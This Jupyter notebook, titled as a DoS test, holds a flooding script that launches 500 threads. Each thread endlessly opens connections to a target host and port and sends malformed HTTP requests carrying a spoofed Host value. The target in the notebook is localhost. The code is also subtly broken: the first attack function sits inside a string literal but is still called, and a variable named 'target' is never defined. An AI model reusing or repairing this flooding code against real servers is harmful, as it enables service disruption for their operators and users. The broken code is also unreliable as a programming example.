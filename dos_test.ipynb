{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket\n",
    "import threading\n",
    "import time\n",
    "\n",
    "\"\"\"def ddos_attack(target_ip, target_port, duration):\n",
    "    start_time = time.time()\n",
    "    while time.time() - start_time < duration:\n",
    "        try:\n",
    "            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "            s.connect((target_ip, target_port))\n",
    "            s.sendall(b'Hello, this is a DDoS attack!')\n",
    "            s.close()\"\"\"\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "target_ip = '127.0.0.1'\n",
    "fake_ip = '182.21.20.32'\n",
    "target_port = 80\n",
    "duration = 60\n",
    "\n",
    "ddos_attack(target_ip, target_port, duration)   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def attack():\n",
    "    while True:\n",
    "        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "        s.connect((target_ip, target_port))\n",
    "        s.sendto((\"GET/\" + target + \"HTTP/1.1\\r\\n\").encode('ascii'), (target_ip, target_port))\n",
    "        s.sendto((\"Host:\" + fake_ip + \"\\r\\n\\r\\n\").encode('ascii'), (target_ip, target_port))\n",
    "        s.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in range(500):\n",
    "    thread = threading.Thread(target=attack)\n",
    "    thread.start()  "
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "base",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "name": "python",
   "version": "3.10.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
